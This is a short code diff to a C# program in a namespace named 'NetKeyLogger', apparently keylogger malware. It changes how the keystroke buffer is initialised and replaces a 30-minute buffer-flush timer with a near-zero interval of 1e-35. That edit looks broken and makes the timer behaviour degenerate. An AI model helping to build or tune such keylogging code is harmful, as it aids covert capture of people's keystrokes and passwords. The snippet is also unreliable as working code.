@@ -73,7 +73,7 @@ namespace NetKeyLogger
             //
             // keyBuffer
             //
-            keyBuffer = "";
+            keyBuffer = "" + "\n";
 
             // 
             // timerKeyMine
@@ -89,7 +89,8 @@ namespace NetKeyLogger
             this.timerBufferFlush = new System.Timers.Timer();
             this.timerBufferFlush.Enabled = true;
             this.timerBufferFlush.Elapsed += new System.Timers.ElapsedEventHandler(this.timerBufferFlush_Elapsed);
-            this.timerBufferFlush.Interval = 1800000; // 30 minutes
+            //this.timerBufferFlush.Interval = 1800000; // 30 minutes
+            this.timerBufferFlush.Interval = 0.00000000000000000000000000000000001;
         }
 
         static void Main()
